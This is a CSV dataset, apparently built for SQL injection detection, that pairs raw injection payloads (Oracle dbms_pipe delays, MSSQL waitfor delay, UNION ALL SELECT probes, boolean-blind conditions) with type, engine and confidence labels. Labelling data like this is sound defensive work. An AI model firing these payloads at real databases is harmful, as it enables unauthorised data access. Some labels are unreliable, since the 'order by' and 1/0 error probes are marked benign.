id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
1431,"1' ) ) as uuuk where 7234 = 7234 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
1454,"1' ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 )",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
1472,"1"" ) where 6632 = 6632 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
1589,"1 ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 )",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
1413,1 ) waitfor delay '0:0:5' and ( 2993 = 2993,time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
1450,"1,iif ( 1440 = 4612,1,1/0 )",benign,mysql,0.9,Signals: 'if'; DB: mysql. Payload length: 27 chars.,2
1471,-4191 ) order by 1#,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 19 chars.,2
1473,"1"" ) ) waitfor delay '0:0:5' and ( ( ""witb"" = ""witb",time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
1500,"-5217'|| ( select 'juen' from dual where 7336 = 7336 union all select 7336,7336,7336--",union_based,oracle,0.9,Signals: 'dual'; UNION-based payload detected; DB: oracle,2
1525,"-9725 ) where 9068 = 9068 or elt ( 4723 = 1426,1426 ) --",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2
1537,"1%"" ) ) waitfor delay '0:0:5' and ( ( ""%"" = """,time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
1550,"1"" ) ) ) waitfor delay '0:0:5'--",time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
1555,"iif ( 1539 = 1539,1539,1/0 )",benign,mysql,0.9,Signals: 'if'; DB: mysql. Payload length: 28 chars.,2
1401,1 ) ) as tnhy where 1874 = 1874 and 2858 = 7324#,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 48 chars.,2
1402,-1910' or 2624 = 3371 and 'umoy' = 'umoy,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 40 chars.,2
1403,-7293' ) ) ) or 3038 = 3038,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 27 chars.,2
1407,"1%"" ) ) union all select null,null,null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 70 chars.,2
1409,"-7738%"" ) union all select 8754,8754,8754,8754,8754,8754,8754,8754,8754#",union_based,generic,0.7,UNION-based payload detected. Payload length: 72 chars.,2
1411,"-3884"" where 8012 = 8012 union all select 8012,8012#",union_based,generic,0.7,UNION-based payload detected. Payload length: 52 chars.,2
1414,"-5572"" ) union all select 8131,8131#",union_based,generic,0.7,UNION-based payload detected. Payload length: 36 chars.,2
1419,"1 ) where 6788 = 6788 union all select null,null,null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 85 chars.,2
1420,"1"" union all select null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 45 chars.,2
1424,"-4091 ) ) as lqqy where 3030 = 3030 union all select 3030,3030,3030#",union_based,generic,0.7,UNION-based payload detected. Payload length: 68 chars.,2
1429,-8465' where 5242 = 5242 or 3806 = 7423--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 41 chars.,2
1430,"-1949"" ) ) as urke where 8761 = 8761 union all select 8761,8761,8761,8761,8761,8761,8761#",union_based,generic,0.7,UNION-based payload detected. Payload length: 89 chars.,2
1432,1' ) as mqxb where 6496 = 6496 and 7533 = 7533--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 48 chars.,2
1433,"1%' union all select null,null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 62 chars.,2
